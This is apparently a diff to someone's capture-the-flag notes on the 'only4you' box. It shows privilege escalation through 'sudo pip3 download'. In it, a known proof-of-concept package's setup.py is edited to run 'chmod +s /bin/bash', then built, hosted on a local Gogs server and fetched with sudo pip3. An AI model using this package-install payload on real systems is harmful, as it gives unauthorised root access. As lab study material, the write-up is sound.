@@ -282,6 +282,53 @@ THer is a way to execute malicious code using pip3 download
 
 [](https://embracethered-com.translate.goog/blog/posts/2022/python-package-manager-install-and-download-vulnerability/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)
 
+```
+john@only4you:~$ cat /usr/bin/pip3
+#!/usr/bin/python3
+# EASY-INSTALL-ENTRY-SCRIPT: 'pip==20.0.2','console_scripts','pip3'
+__requires__ = 'pip==20.0.2'
+import re
+import sys
+from pkg_resources import load_entry_point
 
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
+    sys.exit(
+        load_entry_point('pip==20.0.2', 'console_scripts', 'pip3')()
+    )
 
+```
+so you go into the gog page in test folder
+
+you first get the wuzzi payload from https://github.com/wunderwuzzi23/this_is_fine_wuzzi
+
+then we modify the setup.py file to include `    os.system("chmod +s /bin/bash")`
+
+then we run 
+
+```
+pip3 install setuptools build
+python3 -m build
+```
+
+![](20230721070749.png)
+
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/7653994ddc47cff63133aaed03d744366f3a14c2/this_is_fine_wuzzi-0.0.1.tar.gz
+
+http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+http://localhost:3000/john/Test/src/7653994ddc47cff63133aaed03d744366f3a14c2/this_is_fine_wuzzi-0.0.1.tar.gz
+
+http://127.0.0.1:3000/john/Test/raw/7653994ddc47cff63133aaed03d744366f3a14c2/this_is_fine_wuzzi-0.0.1.tar.gz
+
+![](20230721071611.png)
+
+getting errors
+
+http://127.0.0.1:3000/john/new/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz 
+
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/new/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz 
+
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/new/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+
+![](20230721075023.png)
 
